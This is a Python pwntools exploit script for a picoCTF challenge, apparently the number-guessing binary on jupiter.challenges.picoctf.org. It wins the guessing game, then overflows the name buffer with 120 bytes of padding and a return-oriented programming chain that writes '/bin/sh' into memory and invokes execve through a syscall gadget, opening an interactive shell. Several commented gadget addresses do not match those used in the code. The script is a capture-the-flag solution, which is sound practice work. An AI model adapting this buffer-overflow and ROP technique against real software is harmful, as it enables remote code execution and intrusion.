#!/usr/bin/env python3
 
import struct
from pwn import *
 
p = b''

#- Step 1 -- Write-what-where gadgets

#	[+] Gadget found: 0x482735 mov qword ptr [rsi], rax ; ret
#	[+] Gadget found: 0x40f5de pop rsi ; ret
#	[+] Gadget found: 0x452a37 pop rax ; ret
#	[+] Gadget found: 0x4477d9 xor rax, rax ; ret

#- Step 2 -- Init syscall number gadgets

#	[+] Gadget found: 0x4477d9 xor rax, rax ; ret
#	[+] Gadget found: 0x477db0 add rax, 1 ; ret
#	[+] Gadget found: 0x477db1 add eax, 1 ; ret

#- Step 3 -- Init syscall arguments gadgets

#	[+] Gadget found: 0x40191a pop rdi ; ret
#	[+] Gadget found: 0x40f5de pop rsi ; ret
#	[+] Gadget found: 0x40181f pop rdx ; ret

#- Step 4 -- Syscall gadget

#	[+] Gadget found: 0x4012d3 syscall
 
 
host = 'jupiter.challenges.picoctf.org'
port = 42953
 
r = remote(host, port)
 
elf = ELF('./vuln')
win = p64(elf.symbols['win'])
bin_sh = b'/bin/sh\x00'
bin_sh_addr = p64(0x6ba460)
 
write_gadget = b''
# put binsh into rax
write_gadget += p64(0x4163f4) + bin_sh
# write into address in rsi
write_gadget += p64(0x410ca3) + bin_sh_addr
write_gadget += p64(0x47ff91) + p64(0x445950)
 
#p += pack('<Q', 0x0000000000452a37) # pop rax ; ret
pop_rax = p64(0x00000000004163f4)

#p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
pop_rdi = p64(0x0000000000400696)

#p += pack('<Q', 0x000000000040f5de) # pop rsi ; ret
pop_rsi = p64(0x0000000000410ca3)

#p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
pop_rdx = p64(0x000000000044cc26)

#p += pack('<Q', 0x00000000004012d3) # syscall
syscall = p64(0x0000000000449e35)
 
p += write_gadget + pop_rax + p64(0x3b) + pop_rdi + bin_sh_addr + pop_rsi + p64(0x0) + pop_rdx + p64(0x0) + syscall
 
 
junk = b'a' * 120
payload = junk + p
while 1:
    r.recvuntil('What number would you like to guess?')
    r.sendline(b'66')
    r.recvline()
    resp = r.recvline()
    if 'Congrats' in resp.decode():
        r.recvuntil('Name? ')
        r.sendline(payload)
        r.interactive()
        break